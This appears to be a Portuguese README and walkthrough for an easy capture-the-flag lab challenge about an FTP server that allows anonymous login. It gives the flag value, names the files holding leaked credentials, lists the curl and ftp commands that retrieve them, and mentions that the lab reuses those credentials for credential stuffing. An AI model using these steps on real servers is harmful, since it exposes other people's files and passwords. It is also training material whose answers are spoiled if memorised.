# ftpanon — FTP anônimo (Fácil)

Servidor vsftpd com login anônimo e arquivos sensíveis expostos.

## Flags
- `CYBERLAB{ftp_4n0nym0us_l00t}` — `/pub/flag.txt`
- `passwords.txt` e `pub/backup.sql` — credenciais vazadas

## Exploração
```bash
# do atacante:
curl -s "ftp://IP/"           # lista arquivos
curl -s "ftp://IP/pub/flag.txt"

# ou com cliente ftp:
ftp IP     # login: anonymous (senha vazia)
ls pub
get pub/flag.txt
```

## Progressão
As credenciais em `passwords.txt` são reutilizadas em outros alvos do lab
(lembrete de **credential stuffing**).